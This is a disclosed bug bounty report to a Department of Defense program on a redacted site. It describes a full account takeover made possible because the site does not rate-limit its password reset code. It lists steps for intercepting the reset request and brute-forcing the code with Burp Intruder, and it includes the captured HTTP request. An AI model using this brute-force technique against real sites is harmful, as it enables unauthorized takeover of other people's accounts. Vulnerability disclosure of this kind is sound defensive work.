# Full account takeover in ███████ due lack of rate limiting in forgot password

## Report Details
- **Report ID**: 1059758
- **URL**: https://hackerone.com/reports/1059758
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-16T01:22:05.424Z
- **Disclosed**: 2022-04-20T20:17:46.008Z

## Reporter
- **Username**: takester
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Steps:
1. Visit the link https://www.██████/██████████and enter the valid ████████.
2. You will be redirect to the page where it will ask you to fill your ████████ and ████████ that you get in your mail.
3. Enter the wrong ███ and intercept the request.
4. Then bruteforce the ███.(You can use burp intruder)
5. After valid ████████ it will aks you to create new password

##Request that I intercept
POST ███ HTTP/1.1
Host: www.███████
Connection: close
Content-Length: 197
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Origin: https://www.███████
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.█████████/█████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,mr-IN;q=0.8,mr;q=0.7,hi;q=0.6
Cookie: [value]

██████████&██████=[████████]

## Impact

An attacker can takeover victim account if he has valid email related to the victim.

## Attachments
No attachments
